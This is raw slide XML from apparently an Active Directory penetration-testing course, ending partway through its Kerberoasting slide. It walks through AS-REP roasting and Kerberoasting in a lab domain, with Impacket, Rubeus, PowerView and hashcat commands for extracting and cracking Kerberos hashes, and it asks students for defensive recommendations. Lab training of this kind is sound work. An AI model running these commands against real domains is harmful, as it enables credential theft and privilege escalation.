                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2078835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🎯 What to click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884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Click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see all accounts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75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Click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 Admins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see members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26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Click any user → view attributes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837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052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479190"/>
            <a:ext cx="12192000" cy="617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YOU SHOULD LOOK FOR (IMPORTANT)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When browsing manually, focus on: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👤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Users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Descriptions (often leak passwords/info)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Service accounts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Disabled / old accounts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👥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Groups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Domain Admins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IT/Admin groups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Nested groups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📂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OUs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Structure of organization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 Where admins are located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⚙️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Attributes (GOLD)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description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memberOf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servicePrincipalName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(SPN)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lastLogon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This task is about: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Seeing Active Directory as a tree, not just a graph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20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🔥</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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WHY THIS TASK EXISTS (LDAP)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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Because tools like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> hide complexity.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This step forces you to understand:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="18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What AD actually looks like underneath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/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Seeing Active Directory as a tree, not just a graph</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" dirty="0"/>
              <a:t> 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SUMMARY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PowerView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→ Ask questions  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BloodHound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→ See paths  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LDAP → Read the database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77206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6304"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 03</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13667430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03: AS-REP Roasting (Attacking Users without Pre-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Auth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>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2890"/>
            <a:ext cx="121920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Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>: Find users who do not require Kerberos pre-authentication and steal their password hashes. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="3" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Identify users with the property DONT_REQ_PREAUTH enabled. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="3" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Impacket-GetNPUsers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> to request an AS-REP for these users. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="3" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Cracking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>: Take the output hash and attempt to crack it using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (Mode 18200). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>: Exploiting a common misconfiguration in user account settings to gain initial domain credentials. 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42418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⚠  Where you run things</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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/>
              <a:t>Kali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> → main execution (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Impacket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>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🎯 Objective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Identify domain users where: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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>DONT_REQ_PREAUTH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> is enabled</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 These users are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>potential AS-REP roasting targets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/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🧩</a:t>
            </a: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STEP 1 — IDENTIFY USERS (DONT_REQ_PREAUTH)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You can do this from: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Method 1 — Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>PowerView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> (Post-Compromise)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chemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>NetUser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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>PreauthNotRequired</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> 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Or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Method 2 — Manual Attribute Filtering</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>NetUser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> -Properties </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>samaccountname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>useraccountcontrol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> | Where-Object {$_.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>useraccountcontrol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> -match 'DONT_REQ_PREAUTH'}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Or Using the AD module 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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>ADUser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> -Filter {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>DoesNotRequirePreAuth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>eq</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> $true}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You’ll see users like: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username1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username2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svc-account</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1061770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Method 3 — Using Active Directory Module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</a:rPr>
              <a:t>powershell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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ADUser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> -Filter {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>DoesNotRequirePreAuth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>eq</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> $true} -Properties </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>DoesNotRequirePreAuth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Using Rubeus (no PowerShell needed):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</a:rPr>
              <a:t>cmd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Rubeus.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>asreproast</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>format:hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>outfile:asrep_hashes.txt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This automatically finds vulnerable users and requests hashes in one step.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810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🎯</a:t>
            </a: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PRACTICAL INTERPRETATION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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✅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Case 1 — You get a hash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$krb5asrep$23$user@lab.local:...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This means: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User exists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Pre-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auth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is DISABLED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Account is vulnerable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You can attempt offline cracking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> 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  <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203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Case 2 — You get nothing / error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KDC_ERR_PREAUTH_REQUIRED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This means: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User exists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Pre-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auth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is ENABLED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NOT vulnerable to AS-REP roasting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⚠️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Case 3 — User not found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KDC_ERR_C_PRINCIPAL_UNKNOWN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This means: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Username invalid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14995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🧠</a:t>
            </a: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SIMPLE RULE (MEMORIZE THIS)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AS-REP hash returned = vulnerable user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No hash = not vulnerable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🔥</a:t>
            </a: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IMPORTANT INSIGHT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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>You are NOT “checking a setting directly”.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You are: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Triggering behavior → observing response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WHY THIS IS POWERFUL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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Because: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You don’t need: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login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shell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interaction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Just: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username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domain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DC access</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a: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22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Part 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>REQUEST AS-REP (AS-REP ROASTING)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>🎯 Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Request authentication data (AS-REP) for users </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>without pre-authentication</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/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GetNPUsers.py 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lab.local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 -dc-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ip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&lt;DC-IP&gt; -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usersfile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users.txt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 If users are vulnerable(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>pre-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1"/>
              <a:t>auth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t> is disabled)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, KDC will return AS-REP hashes directly without </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="16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verificaion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you’re looking for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Users that return AS-REP hash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$krb5asrep$23$user@lab.local:...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🧩</a:t>
            </a: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STEP 2 — REQUEST AS-REP (THE ACTUAL ATTACK)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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>If you already know usernames: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GetNPUsers.py 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lab.local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 -dc-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ip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&lt;DC-IP&gt; -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usersfile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users.txt -format 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hashcat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outputfile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hashes.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a: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🧠 What happens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KDC → gives encrypted response (AS-REP)</a:t>
            </a:r>
            <a:b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saved in hashes.txt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 3 — CRACK THE HASH (OFFLINE) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: Take the output hash and attempt to crack it using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> (Mode 18200). </a:t>
            </a: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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Now on Kali: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hashcat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-m 18200 hashes.txt /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usr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/share/wordlists/rockyou.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a: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Meaning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You are guessing passwords locally (no domain interaction)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🧩</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="16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STEP 4 — RESULT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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>If cracked: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 : password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>  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You now have: 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VALID DOMAIN CREDENTIALS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51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algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 04</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3814496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606425"/>
            <a:ext cx="10515600" cy="7778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04: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Kerberoasting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> (Attacking Service Accounts)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266825"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t> Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: Request service tickets for Service Principal Names (SPNs) and crack them offline to get service account passwords. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Use GetUserSPNs.py (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Impacket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>) or Rubeus to list accounts with SPNs. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Request a TGS (Ticket Granting Service) ticket and export the hash. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Cracking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: Use John the Ripper or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> (Mode 13100) to crack the service account hash. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: Service accounts often have weak passwords and high privileges; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Kerberoasting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> is the #1 way to escalate privileges in AD. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Weekly Deliverable: The AD Enumeration &amp; Kerberos Report </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Requirement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: Submit a technical PDF report containing: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>AD Environment Map</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: A list of discovered Domain Controllers and high-privilege groups. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t> Graph</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: A screenshot of a "Shortest Path to Domain Admin" graph. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Attack Proof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: Screenshots of successful AS-REP Roasting and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Kerberoasting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> (showing the hashes). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Security Recommendation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: How to defend against these attacks (e.g., "Enforcing Kerberos Pre-authentication" and "Using Long/Complex Passwords for Service Accounts"). </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3939273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-13078"/>
            <a:ext cx="12192000" cy="7443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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Part 1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Use GetUserSPNs.py (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Impacket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>) or Rubeus to list accounts with SPNs.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STEP 1 — IDENTIFY ACCOUNTS WITH SPNs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🎯 Objective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Find users with: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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ServicePrincipalName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> (SPN)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> set</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 These accounts are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Kerberoastable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> targets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ACCOUNTS WITH SPNs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From Kali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Impacket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GetUserSPNs.py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lab.local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/user:Password123 -dc-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&lt;DC-IP&gt;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✔ Queries LDAP</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>✔ Lists service accounts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🔹 OR from compromised Windows (PowerShell / Rubeus)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Rubeus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>kerberoast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🔧 More precise Rubeus command for output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cmd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Rubeus.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>kerberoast</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>outfile:kerb_hashes.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>format:hashcat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What you get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Output like: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</a:rPr>
              <a:t>ServicePrincipalName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> Name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>MemberOf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-------------------- ---- --------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 err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>MSSQLSvc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/SQL01 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>sqlservice</a:t>
            </a:r>
            <a:r>
